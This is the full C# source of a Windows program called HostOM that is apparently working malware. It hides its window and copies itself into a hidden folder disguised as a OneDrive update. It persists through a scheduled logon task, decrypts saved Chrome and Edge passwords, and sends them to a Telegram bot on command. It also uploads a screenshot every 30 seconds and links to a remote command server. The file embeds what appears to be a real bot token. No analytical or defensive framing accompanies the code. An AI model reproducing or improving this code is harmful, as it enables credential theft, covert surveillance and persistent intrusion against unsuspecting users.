using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Data.Sqlite;
using System.Security.Cryptography;
using System.Linq;
using SocketIOClient;
using System.Runtime.InteropServices;

namespace HostOM
{
    // Cấu hình Source Generator hoàn chỉnh
    [JsonSourceGenerationOptions(WriteIndented = true, DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull)]
    [JsonSerializable(typeof(Program.PasswordExport))]
    [JsonSerializable(typeof(Program.FileManagerRequest))]
    [JsonSerializable(typeof(Program.UploadFileRequest))]
    [JsonSerializable(typeof(List<Program.FileEntry>))]
    [JsonSerializable(typeof(Program.TelegramUpdate))]
    [JsonSerializable(typeof(Program.GenericResponse))]
    [JsonSerializable(typeof(Dictionary<string, string>))] // Thêm cho Payload Telegram
    [JsonSerializable(typeof(object))] // FIX LỖI CS1061
    internal partial class SourceGenerationContext : JsonSerializerContext { }

    internal static class Program
    {
        private const string ACCESS_KEY = "SECRET_TOKEN_2026_HOSTOM";
        private const string BOT_TOKEN = "7311387255:AAGmf8nxtkCkOfVjiW1itKm_nCwoPnCZv0k";
        private const string CHAT_ID = "-5117512902";
        private const string DOMAIN_URL = "https://cloud.quangtrioj.edu.vn";
        private const string ExeFileName = "HostOM.exe";

        private static readonly string MainHiddenFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft\\OneDrive\\Update");
        private static readonly string MainExePath = Path.Combine(MainHiddenFolder, ExeFileName);
        
        private static readonly string MutexName = "Global\\HostOM_Secure_Instance_2026";
        private static Mutex? _singleInstanceMutex;
        private static long _lastUpdateId = 0;

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);
        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        static async Task Main(string[] args)
        {
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero) ShowWindow(handle, 0); 

            if (args.Length == 0 || args[0] != ACCESS_KEY) return;

            _singleInstanceMutex = new Mutex(true, MutexName, out bool createdNew);
            if (!createdNew) return;

            SetupPersistence();

            using var cts = new CancellationTokenSource();
            await Task.WhenAll(
                WarmUpAsync(cts.Token),
                InitFileManagerSocketAsync(cts.Token),
                Worker.RunScreenshotLoopAsync(BOT_TOKEN, CHAT_ID, cts.Token),
                CheckForCommandsAsync(BOT_TOKEN, CHAT_ID, cts.Token)
            );
        }

        private static void SetupPersistence()
        {
            try {
                if (!Directory.Exists(MainHiddenFolder)) {
                    Directory.CreateDirectory(MainHiddenFolder);
                    SetFileAttributes(MainHiddenFolder, 0x2 | 0x4);
                }
                string currentExe = Process.GetCurrentProcess().MainModule!.FileName!;
                if (!currentExe.Equals(MainExePath, StringComparison.OrdinalIgnoreCase)) {
                    File.Copy(currentExe, MainExePath, true);
                    SetFileAttributes(MainExePath, 0x2 | 0x4);
                    string cmd = $"/Create /F /RL HIGHEST /SC ONLOGON /TN \"OneDriveUpdate\" /TR \"\\\"{MainExePath}\\\" {ACCESS_KEY}\"";
                    Process.Start(new ProcessStartInfo { FileName = "schtasks", Arguments = cmd, CreateNoWindow = true, UseShellExecute = false });
                    Process.Start(new ProcessStartInfo { FileName = MainExePath, Arguments = ACCESS_KEY, UseShellExecute = true, CreateNoWindow = true });
                    Environment.Exit(0);
                }
            } catch { }
        }

        private static async Task InitFileManagerSocketAsync(CancellationToken ct)
        {
            try {
                var options = new SocketIOOptions {
                    Query = new List<KeyValuePair<string, string>> { 
                        new("type", "agent"), 
                        new("name", $"{Environment.MachineName}_{Environment.UserName}") 
                    },
                    Transport = SocketIOClient.Transport.TransportProtocol.WebSocket
                };
                var client = new SocketIOClient.SocketIO(DOMAIN_URL, options);
                await client.ConnectAsync();
                while (!ct.IsCancellationRequested) await Task.Delay(10000, ct);
            } catch { }
        }

        private static async Task ExtractPasswordsAsync(string token, string chatId)
        {
            try {
                var pList = new List<PasswordEntry>();
                string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string[] paths = { "Google\\Chrome\\User Data", "Microsoft\\Edge\\User Data" };

                foreach (var p in paths) {
                    string baseP = Path.Combine(local, p);
                    if (!Directory.Exists(baseP)) continue;
                    byte[] key = GetMasterKey(baseP);
                    if (key.Length == 0) continue;

                    foreach (var profile in Directory.GetDirectories(baseP, "Default").Concat(Directory.GetDirectories(baseP, "Profile *"))) {
                        string dbP = Path.Combine(profile, "Login Data");
                        if (!File.Exists(dbP)) continue;
                        string temp = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
                        File.Copy(dbP, temp, true);
                        try {
                            using var conn = new SqliteConnection($"Data Source={temp}");
                            conn.Open();
                            var cmd = conn.CreateCommand();
                            cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                            using var reader = cmd.ExecuteReader();
                            while (reader.Read()) {
                                byte[] enc = (byte[])reader["password_value"];
                                string dec = DecryptChromium(enc, key);
                                if (!string.IsNullOrEmpty(dec)) 
                                    pList.Add(new PasswordEntry { Browser = p, Url = reader.GetString(0), Username = reader.GetString(1), Password = dec });
                            }
                        } catch { } finally { if (File.Exists(temp)) File.Delete(temp); }
                    }
                }
                var json = JsonSerializer.Serialize(new PasswordExport { Passwords = pList, Count = pList.Count }, SourceGenerationContext.Default.PasswordExport);
                await SendToTelegramAsync(token, chatId, json);
            } catch { }
        }

        private static byte[] GetMasterKey(string path)
        {
            try {
                string statePath = Path.Combine(path, "Local State");
                if (!File.Exists(statePath)) return Array.Empty<byte>();
                string state = File.ReadAllText(statePath);
                using var doc = JsonDocument.Parse(state);
                var key64 = doc.RootElement.GetProperty("os_crypt").GetProperty("encrypted_key").GetString();
                byte[] master = Convert.FromBase64String(key64!).Skip(5).ToArray();
                return ProtectedData.Unprotect(master, null, DataProtectionScope.CurrentUser);
            } catch { return Array.Empty<byte>(); }
        }

        private static string DecryptChromium(byte[] encrypted, byte[] key)
        {
            try {
                byte[] iv = encrypted.Skip(3).Take(12).ToArray();
                byte[] payload = encrypted.Skip(15).ToArray();
                byte[] tag = payload.TakeLast(16).ToArray();
                byte[] cipher = payload.SkipLast(16).ToArray();
                byte[] res = new byte[cipher.Length];
                // FIX WARNING SYSLIB0053: Chỉ định tag size 16
                using var aes = new AesGcm(key, 16); 
                aes.Decrypt(iv, cipher, tag, res);
                return Encoding.UTF8.GetString(res);
            } catch { return ""; }
        }

        private static async Task CheckForCommandsAsync(string token, string chatId, CancellationToken ct)
        {
            using var http = new HttpClient();
            while (!ct.IsCancellationRequested) {
                try {
                    var resp = await http.GetStringAsync($"https://api.telegram.org/bot{token}/getUpdates?offset={_lastUpdateId + 1}", ct);
                    using var doc = JsonDocument.Parse(resp);
                    if (doc.RootElement.GetProperty("ok").GetBoolean()) {
                        foreach (var item in doc.RootElement.GetProperty("result").EnumerateArray()) {
                            _lastUpdateId = item.GetProperty("update_id").GetInt64();
                            if (item.TryGetProperty("message", out var msg)) {
                                if (msg.GetProperty("chat").GetProperty("id").ToString() == chatId) {
                                    if (msg.TryGetProperty("text", out var tEl) && tEl.GetString() == "/get") await ExtractPasswordsAsync(token, chatId);
                                }
                            }
                        }
                    }
                } catch { }
                await Task.Delay(5000, ct);
            }
        }

        private static async Task SendToTelegramAsync(string token, string chatId, string text)
        {
            try {
                using var http = new HttpClient();
                var payload = new Dictionary<string, string> { { "chat_id", chatId }, { "text", text } };
                // Sử dụng Context chuẩn để serialize dictionary
                string json = JsonSerializer.Serialize(payload, SourceGenerationContext.Default.DictionaryStringString);
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await http.PostAsync($"https://api.telegram.org/bot{token}/sendMessage", content);
            } catch { }
        }

        private static async Task WarmUpAsync(CancellationToken ct) { try { await Task.Delay(36000, ct); } catch { } }

        public class PasswordEntry { public string Browser { get; set; } = ""; public string Url { get; set; } = ""; public string Username { get; set; } = ""; public string Password { get; set; } = ""; }
        public class PasswordExport { public List<PasswordEntry> Passwords { get; set; } = new(); public int Count { get; set; } }
        public class FileManagerRequest { public string requesterId { get; set; } = ""; public string path { get; set; } = ""; }
        public class UploadFileRequest { public string requesterId { get; set; } = ""; public string path { get; set; } = ""; public string content { get; set; } = ""; }
        public class FileEntry { public string name { get; set; } = ""; public bool isDirectory { get; set; } public string fullPath { get; set; } = ""; public long size { get; set; } = 0; }
        public class TelegramUpdate { public long update_id { get; set; } }
        public class GenericResponse { public bool ok { get; set; } }

        static class Worker {
            public static async Task RunScreenshotLoopAsync(string token, string chatId, CancellationToken ct) {
                using var http = new HttpClient();
                while (!ct.IsCancellationRequested) {
                    try {
                        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
                        using var bmp = new Bitmap(w, h);
                        using (var g = Graphics.FromImage(bmp)) g.CopyFromScreen(0, 0, 0, 0, new Size(w, h));
                        using var ms = new MemoryStream();
                        bmp.Save(ms, ImageFormat.Png);
                        var form = new MultipartFormDataContent();
                        form.Add(new StringContent(chatId), "chat_id");
                        var pic = new ByteArrayContent(ms.ToArray());
                        pic.Headers.ContentType = new MediaTypeHeaderValue("image/png");
                        form.Add(pic, "photo", "s.png");
                        await http.PostAsync($"https://api.telegram.org/bot{token}/sendPhoto", form, ct);
                    } catch { }
                    await Task.Delay(30000, ct);
                }
            }
        }
    }
}